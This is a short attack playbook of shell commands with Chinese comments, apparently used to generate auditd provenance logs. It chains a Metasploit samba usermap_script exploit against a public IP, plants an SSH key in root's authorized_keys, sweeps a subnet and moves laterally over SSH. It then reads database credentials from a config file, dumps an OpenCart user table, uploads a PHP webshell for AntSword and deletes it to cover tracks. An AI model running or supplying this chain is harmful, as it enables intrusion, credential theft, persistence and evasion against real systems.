# 准备工作：auditd设置规则
# sudo auditctl -w / -p wxra
# sudo auditctl -a always,exit -F arch=b64 -F uid=33 -S all
# sudo auditctl -a always,exit -F arch=b64 -F pid=33 -S all
# 可能需要手动开启provdb（结点2）的ssh，这一步后面可以再改进，目前可以先手动开启
docker run -it --network host metasploitframework/metasploit-framework:latest
use exploit/multi/samba/usermap_script
set rhosts 82.157.8.106
exploit
# 结点1，provdb-frontend
ssh-keygen -t rsa -b 4096 -C "your_email@example.com"
cat /root/.ssh/id_rsa.pub # 然后把这里的公钥放到去计算里
echo '公钥内容' >>/root/.ssh/authorized_keys
# 扫描172.19.0.*网段
for k in $( seq 1 255);do ping -c 1 172.19.0."$k"|grep "ttl"|awk -F "[ :]+" '{print $4}'; done
ssh root@172.19.0.2
ssh root@172.19.0.3
ssh root@172.19.0.4
ssh root@172.19.0.5
ssh root@172.19.0.6 # 连接结点2
# 结点2，provdb
# 发现了数据库账号密码
cat /app/src/user/db.conf
# 这一步可能也需要试探
mysql -u root -h 172.19.0.2 -p
mysql -u root -h 172.19.0.3 -p
mysql -u root -h 172.19.0.4 -p # 发现结点3
# 发现了两个数据库
use opencart;
'select * from oc_user';
# 发现账号密码，登录opencart管理员界面
# 上传 1.php
# 进行蚁剑连接
# 删除文件
